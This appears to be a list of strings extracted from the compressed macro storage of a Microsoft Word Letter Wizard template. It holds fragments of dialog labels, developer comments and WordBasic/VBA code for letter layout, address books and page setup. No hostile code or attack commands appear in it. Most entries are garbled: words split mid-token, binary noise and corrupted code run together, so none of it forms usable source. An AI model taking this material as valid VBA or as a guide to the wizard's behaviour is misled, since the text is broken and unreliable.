            "' v\t",
            "  v\t",
            "' v\tg",
            "  v\t",
            "' v\tg",
            "  v\t ",
            "' v\t",
            "  v\t",
            "  v\t ",
            "  v\t",
            "  v\t ",
            "' v\t`",
            "' v\tg",
            "  v\t",
            "  v\tA@^",
            "Lines",
            "Lines",
            "$ T\t",
            "' v\ta",
            "$ T\t",
            "' v\t",
            "  v\t",
            "' v\tg",
            "$ T\t",
            "  v\t",
            "' v\t",
            "  v\t ",
            "Enable/Disable controls",
            "<Back",
            "Next>",
            "Next>",
            "<Back",
            "finish",
            "Next",
            "EnableControls",
            "Show/Hide controls",
            "SHControls",
            "Enable/Disable controls",
            "EnabFields",
            "LetterMethod ",
            "chkloID",
            "chkloWriterInitials",
            "chkloTypistInitials",
            "chkloCC",
            "chkloEnclosures",
            "chkloAttachments",
            " Chk if MAPI environment is present to enable AddressBook buttons",
            "ChangeState",
            "%%%% Wizard Dialog Control Function %%%",
            "Init",
            "Hide OK button",
            "Hide Hint button (no hints)",
            "restore dialog settings",
            "Hide ALL states",
            "Show initial state ",
            "Enable/Disable controls",
            "Next>",
            "Click",
            "Cancel",
            "exit dialog",
            "<Back",
            "Next>",
            "Address Book To DAPFEL",
            "Address Book Return DAPFEL",
            "not gunna happen",
            "save settings",
            "Item contents changed",
            " do nothing",
            "item focus changed  $",
            "idle",
            "clear status bar",
            "B@&\t",
            "bring work to front",
            "updated forced (by moving dialog)",
            "B@&\t",
            "bring the empty window to the foreP",
            "DlgControl",
            " New template based on Wizard",
            " Get location of templates - first look in UserTemplatesPath",
            " and then in Workgroup path",
            " First try to find wizard with long filename",
            " Try to find wizard with short filename",
            " Wizard was found, so save path",
            " StrWizardPath",
            "main error reporting routine called for fatal errors in the wizard",
            "SHOULD NOT BE CALLED FOR POST-WIZARD ERRORS",
            "The next statement seems to reset the ErrorCode object,",
            "even though it is a ByVal argument",
            "2nd parameter is fSuccess",
            "ReportError is not called in post-wizard option errors.",
            "So, always closing the doc.",
            "ActiveDocument assumed to be set",
            "terminate the wizard",
            " ReportError",
            "Attribut",
            "e VB_Nam",
            "e = \"UM0",
            "h Lette",
            "r WizardA",
            " Start",
            "  Macro",
            " Copyrig",
            "ht c 199",
            "5 Mi",
            "rporation",
            "Universa",
            "l DLL decla",
            "@e Func4  FindW",
            " Lib \"us",
            "er.exe\"(lpClass",
            "`$, lp",
            " As 'Int",
            "yAliasl \"",
            "1hWnd",
            "File",
            "9'wComma",
            "dwData",
            "Long",
            "D`Privaz32.dll\" N4A\" (ByV",
            "\u03cashare",
            "d variab@les %%1u blic ",
            "te, Last",
            "Items__(\")",
            "dlggOb",
            "jectF",
            "eAvPrevieBwJ",
            "wizn$",
            "iWorkDo",
            "c, iEmpty",
            "ADCtx",
            "gDo0ogie",
            ":-specif@",
            "ysPath$ ",
            " to pr",
            "ewri}n b",
            "usiness ",
            "s (LET",
            "TERS-PATFH!\tMax`\t'Numbfof",
            "!I)$() 'b",
            "defL",
            "  sfaul@`cgory al",
            "RetAdd",
            "gEnve",
            "lopeLabe&l",
            "@?EL?toui",
            "gCurrent",
            "HeadingP",
            "osi, rt",
            "DistToLfg",
            " Array (m05@3",
            "ngs galor EP]",
            "kTh ",
            "LkUpWF",
            "T,d_",
            "N ormal!",
            "kG@allery",
            "kErrBadV",
            "\t8Tip",
            "#<J, k",
            "sDirb",
            "kSetup",
            "@n[c",
            "Save ",
            "tyls",
            "heet",
            "Look@",
            "ForD",
            "DetailB",
            "ErRhp",
            "chQuotkd",
            "qI#Dota&",
            "AccountID",
            "Dea\"",
            "TypeHe:r",
            "T(ad.Cl",
            "osePonala",
            "0%s&",
            "uP1b",
            "0achm",
            "!`je",
            "PagR",
            "Butto",
            "NotF",
            "ThatW",
            "Cannot%e",
            "ypany",
            "FntAc",
            "Dflt",
            "pt90",
            "pt7\"2s",
            "kFtrQ>",
            "cntmp@La",
            "profL",
            "e8leg",
            "BodyxTex",
            "Subjq\td",
            "o11q",
            "Refp",
            "onst str",
            "ERR_WIZ_",
            "NOT_FOUN>D`[0Jqd ",
            "LShort1",
            "RemB",
            "P@lease  Id0 Loc&be",
            "fT localtiz`F!",
            "Dim kTJecJ{",
            "0p  & dodcu6/o",
            "yoduce`m[Q",
            "Basic",
            ".nRusBa",
            "r \"\u04b0\"",
            "+ \"..f.",
            "uld be ",
            "it apBp@Os in@l",
            "eNew (ch",
            "ange if diffOntk",
            "nh\" '%",
            "BJmW",
            " Exaa8E",
            "Us` check",
            "MAPI iss",
            "MACROBUTTON",
            "\"tDecas4p(d",
            "AT Bh. da",
            "ln\tQ+!C@hr(13)P\"\"",
            "p40xU",
            "City",
            ",\u04f6/Provi",
            "nce  Zipb/tal",
            "Font@b",
            "Misc ",
            "!4LkQK{",
            "u\u026e\u05e1v u}s",
            ":@? 56M",
            "rs-path\"",
            " 'option",
            "al .ini ",
            "file set",
            "ting",
            "m Banter",
            " str",
            "kSetup",
            "Dialog$ ",
            "= \"b",
            "]w\u0724...\"",
            "Crea",
            "&Save",
            "&tyleshe",
            "OLook",
            "lFo$rLzer",
            "RLoa",
            "DetaiBl",
            "-> '= ",
            "for \"some.dot\"",
            "'chQuote",
            "Chr(34)  ' ",
            "tyCmpnyN",
            "\"Comppany ",
            "BodyTex",
            " KeepH\tRetAddr.!",
            "urn ",
            "\tInside'\t",
            "EnclB",
            "sure",
            "Sigc1",
            "2S&a",
            "utonI",
            "ubjLinCBS",
            "ect ",
            "4DaW\"",
            "Re0fIntDx",
            "ence Ini",
            "@`== O",
            "thG spec",
            "ific to ",
            "this wizard ==CtC*_",
            "\"tPr-@",
            "s\u01afs (eg, ",
            "AccountI",
            "qllb/aq@\u0467OX",
            "eH \"",
            "B^&7R",
            " piencK",
            "@\u0329mW ",
            "CloseP o\"",
            "Yours tr0uly,",
            "BuJs`9scnSi1reh",
            "Wri@s",
            "YFg'",
            "Yc,U",
            "Attach>m,",
            "&ma.lZ\"",
            " d8, y",
            "aAob\tHpt90!cK90pt\tpt$72",
            "kFtrD*100.5\\",
            " Used in",
            " DobMergeV",
            "Errm 8age\u0480",
            "tF]d\t\u4900w]\u1cc6\u018f",
            "That?",
            "w\u02f5{ ",
            "a\td$\t 'dvcannotndc",
            "|. Pl ,e cho] a",
            " \"HF",
            "' sb",
            "AG4l`QG",
            "Max]0^",
            "iWL4R",
            "Q '%BSu",
            "% StartW",
            "c[Macro %%",
            "Publ`]A",
            "Main(@XR",
            "eDim",
            "tems__(1j2v",
            "HPqF",
            "]vxiew",
            "T'PzP",
            "$(18f",
            "xa0/__$(",
            "iWindowN\"D#",
            "fa0| As",
            "Q8, f@*",
            "P dl",
            "WordBapsic.",
            "?!(False",
            "P1ne`",
            "iEmpty",
            "HelpC",
            "gDoogiu",
            "2tsP",
            "defLtt",
            "velopeLabel3",
            "Tools",
            "sAnd",
            "toui",
            "Inf*o",
            "g#w0mten ",
            "gCur tHead\u0428Po2s",
            "rtaAWToLf",
            "kGallery",
            "ABadp",
            "kLongo",
            "\tQT ",
            "Fr\\&",
            "@Button",
            "FntArP\u0283",
            "Wndng",
            "kDfltP",
            "ageNum$ ",
            "= \"\"",
            "ptH90_",
            "4kFtrDist1",
            "ErrMaxLi",
            "&cntm",
            "plet",
            "prof",
            "eleg\t",
            "kStyCmpn`yName",
            "BodyTex",
            "RetAddr\t&CC\t",
            "Encl\t",
            "HSig+Sa",
            "E@Inside<R@efIntl| \t",
            "kLettersDi",
            "ubdirect",
            "ory - lo@calize o",
            "ng\"H0\u01efu\\2Wo",
            "rdBasic.",
            "WaitCurs",
            "or 1  'T",
            "his'll t",
            "ake a li",
            "ttle whi",
            "InitSt rings",
            "et the t&e",
            "o@?s &. \"T",
            "are.pp",
            "osed to be in",
            " as@",
            "wizard",
            "Dim T",
            "Dlg As ObjA: S@!",
            "= 7DialogRec@<.F1",
            "\tl)(Fals",
            "CValuesK",
            "If B",
            "?n 'us",
            "er might;creat@O",
            "M. Lo",
            "ok <RdefPault",
            "Dfgs<tybY",
            "AsTPathA$",
            "$7[R\"$]",
            ", 1) <> \"@",
            "*sf\t 0+ kLO",
            "Dot_$)",
            "k)X'short nD",
            "nd If",
            "!Info",
            "p$h, 5$GE",
            "\"C:\\Pro gram A",
            "Microsof",
            "t Office",
            "\\Gs\\mtRem: a",
            "s`k'Amexrgep_<_<",
            " 8{N",
            ".dotdK",
            "rtATo",
            "`g1.258 'UATa`bPlac@",
            "Veri",
            "fyEnviro",
            "nDEPrewr",
            "@enDetai6l$",
            "`^atusBar kUupT$",
            " Begin",
            "58, 252,",
            ";2\"St(artI.[Control$",
            "0dneral c",
            "s, 0-7 (hand/f!6",
            "ictu e",
            "H216 900L1",
            ", \"QyPic\"C",
            "A\" '",
            "arou@;odd",
            "bug --",
            " !0_ two",
            "elo go e",
            "nt@{ widt",
            "c.OKBu@tton 4",
            "ay2\t Wiynevd",
            "sseen! (",
            "o.w. it'",
            "d always",
            "1fc?",
            "~PushQd",
            "\"P(&H)\u04863O",
            "c.Cancel",
            "19H '4?",
            "2J8`",
            "<W@B(&Bb",
            " '5?",
            " '6?",
            "3vi{",
            "p/teI {s__(0a@0",
            "gec/(st",
            "-indepe@",
            "nt)06'%%",
            " q-specic b",
            "s%hep0%%",
            "73a9",
            "iH]p",
            "X\u01ba\u062b^q_\\CT_1",
            " 101",
            "(OptionG",
            "p@;Metho.d",
            "B229e",
            "g\u04f7~1",
            "optlm2=/",
            "P)`E\"2",
            "\"6!1!C\"a",
            "10\"B[@holder_",
            "cA xt 26",
            "Q&1p",
            "kTi\"tip1",
            ")ia+",
            "2: f ",
            "\u01f6\u0625[J",
            "CheckBoxj C5",
            " X(&S",
            "chklo1",
            "(&~D",
            "\u03a4\u0467O\tI",
            "W(&We",
            "WP|er1`s",
            "Typb",
            "istInitials\"",
            "WordBasi",
            "c.CheckB",
            "ox 286, ",
            "150, 214",
            "4\"\u01a5(",
            "&C)\", \"c@hkloCC!7",
            "H(&E",
            "DEnclosu",
            "re\"9",
            "LAttachment\tM",
            "ItemsInS",
            "tate 9",
            "3Tex",
            "t 277, 4I~23:18",
            "\u062e\u69a1@H?",
            "ptionGro",
            "up \"UseL",
            "etterhea",
            "But@ton 2986",
            "189tY",
            ":(&L{",
            "-}S4S",
            "S6cS",
            "2733",
            "SNP5]",
            "pb`BU",
            "?P$osonV85",
            ", Bu0Ea",
            "W(&T=AtT`heTop(",
            "Lefth",
            "\u030411H",
            "k(&R&B",
            "Righ",
            "Zd10Z62Z\tY",
            "\u076dnhj",
            "Z(&S)S-\t2@&6`",
            "ZSpalce",
            "i?kTip$itip5",
            "30R7",
            "3!\" ",
            "z|5w|3!",
            "\u0473qTv",
            "!D:6",
            "25 lA^\"A",
            "R ecipi",
            "Ad*d`s",
            "11'-",
            "a}(&Y)",
            "turBn<",
            "PushD3A2!d2I8\"!1...a1",
            "1\" '4",
            "\t12-1\tX)\t2\t\u0208J;6&#",
            "O04`!30a<",
            "\u02e6?\"WizpStyl\\Kk7h8, ",
            "/j\u59a1G",
            "Of)(P]",
            "10Hg",
            "7: Fin",
            "Pic %e ",
            "264!+\"Flag",
            "a.p>f",
            "\u0625K\u07c0\u077f\ufdb5!",
            "z\u0677QxO",
            "elpOrEnvpelop",
            "\u02a9\u03b6lH",
            " v G",
            "$u@n\u0721",
            "Yi(&J)!",
            " 'Number  of i i",
            "eFilePre",
            "view__(L",
            "ast5) = CJ",
            "EndD@o",
            "Set d",
            "CurV@alues.pr'",
            "me defauplt v",
            "s@.Tools",
            "Info to",
            "0fWe'",
            "re r",
            "finally!",
            " throw",
            "e wizar d ont@",
            " screen:",
            "0 `~n",
            ";9Wait",
            "Genera(l B",
            "=g@Doogie",
            ".WindowL",
            "` (i`",
            "kDo@c) 'en",
            "work docH is1",
            "tests",
            "() <> ",
            " Exit HSub",
            "CA`e 2 '",
            "u(w/o",
            "ut savin,g)",
            "me$]",
            "empty",
            "Elso",
            " Updat",
            "Bookmark(\"r",
            "_EditGoT<o ",
            "p0EL",
            ".Extractq",
            "ess8",
            "<sAnJdR<s5EL,w",
            "e al",
            "<set",
            " (see >ow8%",
            "a= \"\"B$;",
            "nd If;",
            "lgEL.Ret",
            "AddrText",
            "End ",
            "LSelec",
            "t Case x7",
            "Tab <",
            "> \"0\" Th",
            "1Appl",
            "ication.",
            "MailingL",
            "abel.Def",
            "aultPrin",
            "tBarCode",
            " = FalseC0M",
            "#Out ",
            "ess:=fa",
            "E1ctiveD",
            "ocument.",
            "Envelope",
            "1Extrac/",
            "D, @return",
            "eed to p",
            " a d*",
            ";r^2",
            "C@Ft0eNew`t A",
            "tInsert '",
            "tdosWi",
            "ndowList@(iWorkA) here..TxY' ",
            "noth@5?k",
            "dBasic.Ex",
            "Bookmar",
            "k(\"letterbody\")",
            "WW7_E",
            "ditGoTo ",
            "pwn 1, ,",
            "FileTe",
            "mplates ",
            "Store:=0",
            ":=Normal_$, ",
            "@kStyle80",
            "'c1Number chang@\tw",
            "G s\"s ds a",
            "s since ",
            "in some ",
            "it (is ",
            "nxas \"\"",
            "s bef",
            "=#tWh ",
            "= G\"Counta",
            "s())K0@?(",
            "ame$]k",
            " S$)?@",
            "Clo \u0317=",
            "+j$8end",
            "'All .ne!c",
            "ScreenUpBd`ng -R",
            "Sub '%",
            "%Lar",
            ",zar",
            "\t`\tWi",
            "-spe",
            "cific ro",
            "utbs",
            "`vZ ",
            "Ge@t",
            "ewri9nDe",
            "Dim  def$",
            "pa4th",
            "atusx kLC>`?ForL>s",
            "rVar\"\"",
            "N`#\"",
            "Lttr",
            "xFetcHhPr@",
            ") 'H1`K0,ena",
            "d4wo",
            "rdwiz.ini??",
            "Prof 24Stsg",
            "..How abp",
            "/winA",
            "'No,!> ass",
            " t hey'r?ub@dir of",
            "graP",
            "irec]Hy",
            "get/",
            "Right`",
            "+8\tA[s5\t P",
            "*.*f= ",
            "rdSj",
            "[Lefh",
            "Len(\t) - 88F_r",
            "(\".P",
            "'(P[P",
            "Yst@ we cap)o'",
            "1s13\u03c2",
            "_<adP<",
            "tA<LP}t:fKDFunpon a=UnitDq",
            "lgTO As Obj",
            ": SP)",
            "fDialo",
            "gRec:.To olsOp1sGeneral(",
            "CurValues?",
            "AJ$(u",
            "o%a\"Unkno",
            "s!\" 'd",
            "ebug onlL/",
            " CortIn@chesTo!\tsP(oldP ,w",
            "'new`",
            ": '0p",
            " * 2.54",
            "pty1",
            "$y7o",
            "newVal@ = old",
            "WordB",
            "asic.Pri",
            "ntStatus",
            "Bar \"Unk",
            "nown uni",
            "ts!\"",
            "lEnd Select",
            "ConvertI",
            "nchesToU'",
            "nction",
            "cvate M",
            "D8im ",
            " Cxase",
            " 'iM",
            " / 2.54",
            "2: 'ptRs",
            "Else",
            "zzjzPre",
            "ttyMeasu",
            "rement$(the@, ",
            "|u$/If ",
            " < 11) Then v",
            "* 2 @+ 0.5)h ",
            "A Name%#A",
            "( > 0",
            "\"< \"",
            "8([L",
            "Trim$](Str(v))D",
            "Rem@",
            "is f",
            "sumes input @",
            "APRightD",
            "istanceT",
            "oLef",
            "$(fromEdge",
            "Def.nd",
            "lgPg As (Obj~:",
            "= /Dial ogRec.F",
            "ilePageSetup(FaT#,",
            "Cur ?ues",
            " , Get",
            "ault7Y! ",
            "Widtph) -H",
            "a*Margin5",
            "\"Sub I",
            "nsRedSl@ot(s$)`B'",
            "DAPFEL, ",
            "Changed ",
            "to a MacroButt!!G",
            "'MUST HAVE Empp",
            "H.wiz templ",
            "\"ToolsO",
            "pAsView ",
            "FieldCodes:=1",
            ":=kH",
            "r( 4\t k",
            "Z >0\u07206)\u07018`",
            "ituteBan ",
            "s(>jv",
            "erInde",
            "x#iDDoStyleMerg",
            "Exzing",
            "Bookmark",
            "(\"bkAddress\"2 X",
            "(dit",
            " N:=x",
            "3oTo",
            "@recipi@Z 6a",
            "FsQPH d",
            "ef16",
            "(AT q",
            "ry)\\1I+ bop@r2%",
            "G\t[DlgText`Q\"tp",
            "ATEntry$",
            "le'not able!9re ",
            "pce sba:`",
            "  with ",
            "6ty stg. a",
            " remainsPcS=.{",
            "ABIX",
            "Para,",
            "9Gp7nter",
            "*D@Fo*csEo*\"\"",
            "Time",
            " kFormal{",
            ",5Rkrn5",
            "(WW6_a",
            "p2gue( \"UseLChead",
            "= 1/.",
            "\t 'Pl",
            "( Paper",
            " 'ove",
            "ragraphperk",
            "Company",
            "#PwMu",
            ".O%rO%\t ",
            "Cmpny",
            " kType",
            "W<izB",
            "WW7<Auto]T",
            "cntmpgfx82\",",
            "n Pbra li",
            "nevrodu~ccc",
            "\u0230qu ",
            "of 0wo. D&o0",
            "hff  R",
            "ea c%",
            "over let\"t",
            "`and",
            " mom, be",
            "cause yo",
            "u do not",
            " have \"C",
            "ompany N",
            "ame\" sty le",
            "rdBasic.",
            "CharRigh@t 1, 1",
            "W6_EditC",
            "lear",
            "$Els",
            "XInsertP",
            "If 'Wiz",
            "rBookma",
            "f:=\"bk",
            "ReturnAd",
            "dress\", `GoTo:\t%",
            "!DlgValu",
            "e(\"Z'\") ",
            "<> 2) Th",
            "en ' Cnt",
            "mp or Pr,of\u0451F",
            " = 0 To ",
            "36\u0281:F__$(ii",
            "+ Chr(13)O",
            "Next iiw",
            "<*4;U",
            "H3A1 'elegant?_s?_s",
            "+ \" E \"",
            ">AY^'Do Nothing",
            "* -3 'ge@t rid afast bul@",
            " 'LHead",
            "Exist )( wg",
            "nRedSlot k",
            "2 toui.",
            "[6E ",
            "LDone:",
            "Sub!5e",
            "Pr@ivate ",
            " Set(nm |Dim ",
            "T`*!",
            "Ltempd",
            "On Err",
            "! -1: +",
            "$](\"@.a",
            " - 1)@",
            "`0\t0Q",
            "ConTuiBx ",
            "InSt`[,%",
            ",\\1)",
            "While ",
            "Len(",
            "Left",
            "&j +N ",
            "en0@2",
            "= i&",
            "yb!D",
            "&nm0",
            "1|>\t#a4 \"t4Recipien",
            "E'shou",
            "ldn'\u046bppen",
            "RD 'nm",
            "?2<:",
            "3\\<@F",
            "'Only aff",
            "` the fi",
            "rfMAPI l`oad e",
            "B$omm",
            " Yr\"s $6",
            " is pdue ",
            "g,@ disab:buttons",
            "Focus 4\u0221",
            "c.P\"_",
            "'l '",
            "1mlF",
            "unction RmTrail LFs$(t`]",
            "$)-ukes ",
            "8ra %&in a0r ",
            "[nQo",
            "U3eO",
            "?OAo1Ow",
            "Sub ",
            "TwoPageHack(num",
            " h@er/fo",
            "WW7_7",
            "Break-",
            "DP>m`W",
            "$up Dif",
            "rentFirs",
            "tPage:=1",
            "If n",
            "um = 1 T",
            "`Wor",
            "dBasic.V",
            "iewHeade",
            "BDlg",
            "Value(\"W",
            "izStyle\") <> 2)",
            "XInsert ",
            "Chr(9) +",
            "dElse",
            "2nd If",
            "lDateTim",
            "e kFormafl",
            "/2F8oot\ue711",
            "Fi8eld",
            ":0XVa150p\" \"",
            "ditSelec0tAll",
            "WW6_",
            "Clea@",
            "{Sub",
            "PPriv ",
            " Cre",
            "Dim ",
            "recpAddr",
            "ess@C",
            "abPlace",
            "ntStatu@sBar k",
            "i`ngDoc",
            "aitCurso",
            "' bra",
            "nch on l",
            "* type :",
            " shrinkwrapped  ",
            "origina!",
            "#[|Tex@t$](\"t",
            "R`ecipid",
            " \t\t s\t, R@mTrail",
            "L0Fs$()",
            "re?),|",
            "Rem *",
            "*&dchklo!IE0\u0310TwoA~H",
            "ack (1) ",
            "s in a 2hp h|/fl6",
            "(~25",
            "g\tau-r CaseDn#e!",
            "ntrntWnd<ngM%",
            "kDflBNumJ9",
            "tArial",
            " \\r_",
            "`K(G",
            "6A@5O@:!\t2= `r]1",
            " thi?s c`ode f8_as",
            "UsesrF",
            "mJ$[Hf",
            "Spr[!",
            "On Err",
            "GoTo -1:",
            "LBadMeasuremPj",
            "!Positioni",
            "s3  ' at",
            "e top",
            "File",
            "p TopMary w:=",
            "'{the",
            "Left",
            " U2Q",
            "RigNh",
            "5  B",
            "LHDon",
            "rev empty7",
            "ocClo",
            "workAp docu",
            "w/out savP",
            "E\u01e7\t:Pa",
            "'Hey",
            ",C8would ",
            "bePxgood ",
            "tto fig* q",
            "wher %",
            " a/d`",
            "Dist\u041feTo",
            "P1.25\" fXrom,\"! BwPhat?",
            "'we'\t",
            "*af@*Q",
            "(if\u0406cludedD",
            "_BQ1S",
            " 'it's not",
            "TJ\"c.JBookmark \"Pip",
            "`f[#\" k`",
            "am!!\t",
            "  DAPFEL",
            "move",
            " '+ J",
            "DlgText$",
            "`Reci",
            "pientNam@e\")",
            "ordBasic",
            ".EditBoo",
            "kmark \"r",
            "\", Add:",
            "^Inser",
            "tRedSlot",
            "<'le",
            "t = Len(",
            " ) + 2",
            "for [,d ]",
            "alue(11)",
            "E1 Then",
            " \",\" Else",
            "Para",
            "8\"ch",
            "kloID\")  And (I<>> LJ",
            "St yle k",
            "SubjLine",
            "qbkRE",
            "ccountID\u02d8 iE",
            "GpBodyB",
            "~letterb",
            "[~TypeHerE7",
            "Form",
            "atTabs ClearAll\u0195",
            "R\tPosition:=Date",
            "Place$, ",
            "SetP",
            "yDI0kCl",
            "osePerso0nal$",
            "C\tBus",
            "A}('sp- ",
            "wriW's n",
            ")A'if not p%C",
            "#RRefIntl",
            "In 1als`c+_",
            "Jistl",
            "0|/t",
            "QA\t?",
            "/CCgr.",
            "';CCl-",
            "#Ufa)C",
            "EnclH",
            "osureSM9m",
            "umberl",
            "4Attachm",
            "A k(",
            "$`Chr(13.3Dc",
            " 'o'",
            "artOfDoc",
            "  ' go",
            " back to the s",
            "'L_Method`'= w'P7,",
            "Wizr",
            "Contemporary ",
            "WW7_",
            "iAut",
            "):=\"c",
            "ntmpgfx2Pi",
            "Uses",
            "heaY",
            "\t%Cmpny",
            "+YFeComp",
            "P\te(\"",
            ")d+\tk\t",
            "8Ret",
            "?>seo",
            "a-y2+#",
            "`6C)  Prof ",
            " iiP0 To< 3",
            "\t__@$(ii) ",
            "\"_05w",
            "4TA\t=elegant",
            "+ \" <E ",
            "o Nothing",
            "WW6b",
            " -3 'ge@t rid 18ast bul8O\tOC",
            " ']H]",
            "Tim@",
            "FormalDa",
            "End If",
            "LPrewri",
            "ttenCont inue:",
            "rdBasic.",
            "StartOfDocument",
            "ViewPage",
            ".Zoom Au",
            "toFit:=1",
            "\"If ",
            "\\Dlg",
            "Value(11",
            ") = 0 Th",
            "CharR",
            "ight 1, ",
            "1 'selec",
            "t Compan`y Nam",
            " PickStyle",
            "r2vR()Q",
            "mEditS",
            "8All",
            "WW6_",
            "Cle$ar",
            " Case",
            "z\"Wiz",
            ";Text",
            " kGaller",
            "y$, Inser",
            "`@\"UseLe@rhead\"Ac1Bc",
            "d:=\"c",
            "ntmpgfx2\"R%",
            "Rb\tE",
            "{D2W BB",
            "O\tADim$ nn$\"\"",
            "prof.l@r",
            " OFi",
            "`b@vSetup ",
            "FooterDi",
            "stance:=",
            "1$ + Chr(34S",
            "!(MaitCur",
            "sor  On ",
            "GoTo -1: +",
            "issing",
            "$y Temprl:=E",
            "\u03baMsgBox k ",
            "NotFound+>`++O",
            "2`wizn ",
            "ParseRetAddressEii",
            "!jt%NA",
            "0iPos!* iq#o 7c",
            "__$(ipN",
            "[@0!$](\"t@",
            "xurnD",
            "<p> \"\"\uca21",
            "InStr(",
            "mH13)(mWht ",
            "A(i < ",
            "< LtenC\t)",
            "A[pLeft",
            "-< 1",
            "Mivd",
            "i@Gd5",
            "Els\u0505",
            "Wend",
            "Lin\\es",
            "'%% ",
            "4|t@e : DePem",
            " the n2",
            "5Fun ctiong",
            "(old",
            "at follpows ",
            "3@Metho",
            "+ uo",
            "defaul",
            "!'/'!'preced",
            "/&\"&Pw",
            "$- $t+",
            "$D$$",
            "$#H#0iqJelhpNew\"Rt",
            "OF(\"#",
            "  gCurre",
            "ntHeadin",
            "gPositio",
            "n = lhpN ew",
            "Ppt90_$:",
            " R\t0T",
            "\\Select Case",
            ")0: ",
            "M216c\tN",
            "!1: ",
            "!End ",
            "WordBasi",
            "c.FilePa",
            "geSetup ",
            "TopMargi",
            "n:=T$, L(eft",
            "{Pic",
            "kSty",
            "#revi:If",
            "% DoButt",
            "onCl",
            "Handle custom b",
            "s (overr@ide st",
            "if ne",
            "cessary)",
            "Private Func",
            "(idZitem",
            "Dim ret",
            "lette@rIndex",
            "fname@4",
            "~0 'Cha",
            "nge valu",
            "e ofA",
            " wh0en w",
            "V*(e",
            "g, \"Next",
            "'Note",
            ": # 6 is",
            ">\"eC",
            "StA4= 3 A+nB",
            "I@2s__(0) T",
            "tDlgV*@(\"UseL",
            ":hy\")B3",
            "69 'forc@h@G",
            "Upd@*\u0407",
            "Else",
            " 'TEST",
            "343!",
            "3#3'\u014f 4<>v",
            "  )#",
            "5lNPars",
            "eRetAddr",
            "Lineps > ",
            "l2''",
            "Fo  \"th@",
            "MsgBox",
            " kErrMax3",
            " 48g",
            "c@= 5",
            "h 6?>e",
            " uNLC",
            "ontinue:#f",
            "= 71 ' FINISH",
            "CrewP",
            "dVHelpOrEnvelope",
            "Label@",
            "s.Tool",
            "s dlgELK",
            "+DA*",
            "[ *TE$](Fcipi",
            "?\tn3?\t",
            ".Extrac[5",
            "ThdmeandP",
            " frtwizsnow2?Y",
            "H8S0",
            "zSub ",
            "udywolvd",
            "}5am\"optlm\"<.",
            "d!Dip1D\", ",
            "bGPLuto#@",
            "\" + ",
            "3,| 32",
            "SaveDial8og(",
            "ausBar k",
            "HgsT",
            "@Pref \"SDMethod&'3Td%",
            "chkloQ)",
            "WrpR",
            "1pals",
            "TypistIn",
            "Encplosup_",
            "Attachm IA\t'3s6",
            "hpSpace ",
            "Multi",
            "\\ReS",
            "t=z'6",
            "finish",
            "f\u0139,Rst,",
            "sheet",
            "i/t/q",
            "/,> p0qid #113",
            ")?OI*[/?1TN+KLT",
            "rimPStr(",
            "ue(11)AL1)), ",
            "'PFor 0",
            "DlgValPr",
            "ef \"chkl",
            "oEnclosu",
            "res\", 0",
            "ttachmen",
            "XUse",
            "Letterhe",
            "&Posi",
            "tion",
            "gCurr",
            " 0 = -",
            "lect Cas",
            "e WordBa",
            "sic.",
            "StateIte",
            "ms__(4 - 1) +",
            ":\"AtTheT8op\"",
            "Left",
            "Righ",
            "tMsgBox \"In",
            "nal erro",
            "r (LHP b",
            "ad)wizn",
            "ame$, 16",
            "#End ",
            "Text \"ti8p5t@",
            "[G@etAuto",
            "$T](",
            "\t\"Sa",
            "unit@J@",
            "DefaultU",
            "`AS0pace",
            "tt0yMeaA$(",
            "ConvertInchesTo",
            "(2, ",
            "iLin",
            "RecipiqAdd@A",
            "toui.",
            "Wiz0Styl?'f`inishI3F",
            "H@elpOrECl",
            "PickC",
            ";view",
            "I*fQ\"K)`50 Tn UpdeLmC\t'%PrintjusBar k`",
            "sheet$`",
            "defj!0Docu!?VaraLcDN",
            "<> \"\"C",
            "'oh, goo",
            "dy: Mr. ",
            "\t is ",
            "boss me  arou_ag",
            "ain. Joy, joy.",
            "Look",
            "r$`^chQuoLteA",
            "\"8...~g",
            "Metho0Ea",
            "'Nwrin",
            "s1sip1`optlm!t'",
            "[ LTrim +Str(",
            "(1$@k ",
            "yIf#",
            "'\t,D\" ub",
            "C`CQ",
            "%% Comm",
            "fard 0Rout@|",
            "vW Sub @Verifydi rons(FDim windSA",
            "pfBadL",
            "owser As",
            " Obj: S(et ",
            "=hia",
            "log  .To olsOp!sG",
            "eneral(F>a`TG\"`xue",
            "gDoo",
            "gier",
            ".BlueScree$B\u02c7",
            "Disa",
            "bleInput",
            " ESC",
            "ape (wor ks co",
            "yctly in d",
            "[File;FromW",
            "owp'",
            "IsMa",
            "cro() Or",
            " In+",
            ", \".\") p",
            "Edit1",
            "qAll",
            "Le:nh2[C",
            ") > 1",
            "PF1`",
            "t|kErr) uk.{Q",
            "~130de8'A",
            "f0 all t",
            "hat,P",
            "T may st",
            "Qgus",
            " (even i`f we  &3d",
            " a new onRbove!",
            " 'Cl>e`` ",
            "WW6_",
            "A$7\\_\u03f3!\"Q",
            "< o\t'",
            "'s}<o$n",
            "*\u0449R\"s",
            ",make  no`",
            " $s``",
            "e executed!\tOn ",
            "GoTo: ",
            "Fatal",
            "b.ewS",
            ", empty",
            "'re-en9 a$",
            "Qgrab pag",
            "etup ^",
            ")YqMdlgPgLup1M",
            "B%!Cow #%thP%#",
            "iJWhN Bz",
            "bJE0) 'd",
            " our origi\tc",
            "Wend",
            "List (",
            "switc",
            "hpck to q",
            ".Or!a1q",
            "'neeBdq",
            "swaps,d",
            "isG,a",
            "h Active",
            "nt.F)s",
            " QPPo`4s(Px(",
            "He1)'",
            "ight = C",
            "entimete",
            "rsToPoin",
            "ts(Val(d",
            "lgPgSetu",
            "p1.PageHe",
            "End With",
            "o NoErro",
            "@Wor",
            "dBasic.D",
            "isableAu",
            "toMacrosD 0",
            "\"On ",
            "L-1: ",
            "Su2b",
            "o'=!",
            "Pr@ivate ",
            "xStorePr",
            "ef(id$,  val_$wDim v$JIf",
            "\"\" Then",
            "~\" Els~e",
            "rofileSt",
            "ring kWizname8",
            "Environ(",
            "\"windir\") + \"\\w",
            "wiz.ini\"",
            "wbFuncti",
            "on xFetch",
            "[Get&$](?",
            "YSaveDlg@",
            "'F_ A@G(1=)\u0643",
            "ueB4",
            " Rst",
            ", default",
            "ner[v",
            "h)) - 1 ",
            " 'get th!alue\u01d1 << 0@",
            "(#'e",
            "nsure le",
            "galue (",
            "unless t",
            "oo big..",
            "TooBig\u0363S-v",
            "rdvpexit|",
            "r.NumbeD'",
            "bscript ",
            "f ran",
            "ge @",
            " v iF",
            "ScreenU",
            "pdatao-1 @'make -t",
            "urned8 on'",
            " 'reporC:",
            "Ha^e'`&A",
